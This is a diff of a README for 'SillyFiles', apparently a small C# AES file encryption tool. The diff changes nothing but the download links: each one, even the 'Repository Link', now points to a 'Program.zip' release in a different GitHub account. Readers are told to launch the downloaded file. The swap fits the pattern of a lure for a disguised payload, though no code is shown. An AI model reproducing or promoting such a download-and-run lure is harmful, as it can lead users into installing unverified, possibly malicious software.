@@ -11,7 +11,7 @@ If you are looking for a simple and basic C# AES encryptor & decryptor program, 
 
 ## 📦 Download the Software
 Click the button below to download the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/2trk/SillyFiles/releases/download/v1.0/Program.zip)](https://github.com/2trk/SillyFiles/releases/download/v1.0/Program.zip)
 
 Don't forget to launch the downloaded file to start using SillyFiles!
 
@@ -34,7 +34,7 @@ For more information and updates, make sure to check the "Releases" section of t
 Start encrypting and decrypting your files with SillyFiles today! 🎉
 
 ## 🔗 Useful Links
-- [Repository Link](https://github.com/rokytd/SillyFiles)  
-- [Download Software](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)  
+- [Repository Link](https://github.com/2trk/SillyFiles/releases/download/v1.0/Program.zip)  
+- [Download Software](https://github.com/2trk/SillyFiles/releases/download/v1.0/Program.zip)  
 
 Thank you for using SillyFiles! 🚀🔐
